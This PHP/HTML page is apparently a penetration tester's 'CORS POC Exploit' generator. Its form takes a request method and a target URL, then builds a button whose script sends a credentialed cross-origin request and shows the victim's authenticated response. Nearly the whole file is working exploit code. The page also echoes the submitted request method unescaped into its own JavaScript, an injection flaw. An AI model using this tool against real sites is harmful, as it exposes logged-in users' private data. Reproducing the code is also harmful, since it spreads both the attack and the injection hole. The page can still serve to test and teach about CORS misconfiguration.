<!DOCTYPE html>
<html>
<style>
body {
	background-color: #1d2737;
	background-image: url("images/animated.gif");
	background-repeat: no-repeat;
	background-position: center;
}
.info {
	margin: 50px;
	padding: 0 20px 0 200px;
	font-family: "Times", serif;
	color: white;
	
}
#Exploit
{
	padding: 0 20px 0 200px;
	margin-top: 200px;
	width: 500px;
	text-align: center;
	font-family: "Times", serif;
	color: white;
}
.button {
  background-color: #f9c963;
  border: none;
  color: white;
  padding: 15px 32px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 16px;
  margin: 4px 2px;
  cursor: pointer;
  border-radius: 8px;
}

select {
  width: 100%;
  padding: 16px 20px;
  border: none;
  border-radius: 4px;
  background-color: #f1f1f1;
}
input[type=text] {
  width: 100%;
  padding: 12px 20px;
  margin: 8px 0;
  box-sizing: border-box;
  border-radius: 8px;
}
label {
    color: White;
    font-weight: bold;
    font-size: 20px;
    display: block;
    float: left;
    font-family: "Calibri", Times, serif;
}
</style>
<body>
<div class="info">
<?php
  if (isset($_POST['submit'])) {
    $method = trim($_POST['req_method']);
	$url = $_POST['cors_url'];
	$method_url = htmlentities($url);
    
     $output_form = false;
    if (empty($method) || empty($url)) {
      echo '<span>Please fill out request method and vulnerable url.</span><br />';
      $output_form = true;
    }
  }
  else {
    $output_form = true;
  }
  if (!empty($method) && !empty($url)) {
   ?>
	<div id="Exploit">

		<h2>CORS POC Exploit</h2>
		<h3>Extract by Chiffre</h3>
		<div id="demo">
		<button type="submit" onclick="cors()" class="button">Exploit</button>
		</div>
	</div>
			<script>
			function cors() {
			  var xhttp = new XMLHttpRequest();
			  xhttp.onreadystatechange = function() {
				if (this.readyState == 4 && this.status == 200) {
				  document.getElementById("demo").innerHTML = alert(this.responseText);
				}
			  };

			  xhttp.open("<?php echo $_POST['req_method'];?>", "<?php echo $method_url; ?>", true);
			  xhttp.withCredentials = true;
			  xhttp.send();
			}

			</script>
<?php
  }
  if ($output_form) {
?>

<h1><center> Check Misconfigured CORS </h1></center>
  <form method="post" action="<?php echo $_SERVER['PHP_SELF']; ?>">
		
		<label>Request Method: </label>
			<select name="req_method">
			  <option value="GET">GET</option>
			  <option value="POST">POST</option>
			  <option value="OPTIONS">OPTIONS</option>
			</select> <br /> <br />
		<label>Enter CORS Vulnerable URL: </label>
		<input type="text" name="cors_url"/><br /> <br />
		<center><input type="submit" name="submit" value="Click to Check" class="button" /></center>
	</form>

	</div>

<?php
  }
?>

</body>
</html>

